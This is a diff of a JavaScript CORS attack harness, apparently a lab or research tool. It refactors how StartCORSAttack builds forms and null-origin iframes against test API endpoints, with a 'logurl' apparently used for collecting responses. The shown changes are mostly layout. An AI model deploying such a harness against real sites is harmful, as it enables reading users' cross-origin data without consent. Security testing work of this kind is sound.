@@ -8,7 +8,8 @@ function sleep(millis) {
 
 function CreateCORSForm(url, type, logurl, page){
     var url = url + "/" + page
-    var div = document.createElement("div");
+    var div = document.createElement("p");
+    div.setAttribute("id", "P_"+type+page)
 
     var input = document.createElement("input");
     input.setAttribute("id", type+page+'Button');
@@ -78,8 +79,8 @@ function CorsNullReq(url, type, logurl, page){
     } 
     var url = url + "/" + page
     
-    var div = document.createElement("div");
-    div.setAttribute("id", "iframediv_"+page)
+    var div = document.createElement("p");
+    div.setAttribute("id", "iframediv_"+page+type)
 
     var input = document.createElement("input");
     input.setAttribute("id", type+page+'ButtonNull');
@@ -107,20 +108,41 @@ function CorsNullReq(url, type, logurl, page){
     button.page = page;
 }
 
-function StartCORSAttack(url, logurl){
-    var types = ["GET", "POST"];
-    var pages = ["api_correct", "api_null", "api_gen"]
 
-    for (let i = 0; i < types.length; i += 1) {
+function CreateCommonDiv(methods, pages){
+    for (let i = 0; i < methods.length; i += 1) {
+        var div = document.createElement("div");
+        div.setAttribute("id", methods[i]+"Forms")
+
         for (let j = 0; j < pages.length; j += 1) {
-            if(CreateCORSForm(url, types[i], logurl, pages[j])){
-                console.log("Successfully created CORS forms!");
+            form = document.getElementById("P_"+methods[i]+pages[j]);
+            iframe = document.getElementById("iframediv_"+pages[j]+methods[i]);
+            div.appendChild(form);
+            div.appendChild(iframe);
+        }
+        
+        document.getElementsByTagName("body")[0].appendChild(div);
+    }
+}
+
+function StartCORSAttack(url, logurl){
+    var methods = ["GET", "POST"];
+    var pages = ["api_correct", "api_null", "api_gen"]
+    
+    
+    for (let i = 0; i < methods.length; i += 1) {
+        for (let j = 0; j < pages.length; j += 1) {
+            if(CreateCORSForm(url, methods[i], logurl, pages[j])){
+                console.log("[+] Successfully created CORS forms!");
             };
-            if(CorsNullReq(url, types[i], logurl, pages[j])){
-                console.log("Successfully created CORS NULL iframes")
+            if(CorsNullReq(url, methods[i], logurl, pages[j])){
+                console.log("[+] Successfully created CORS NULL iframes")
             }   
     
         }
     }
+
+    CreateCommonDiv(methods, pages);
+    
 }
 
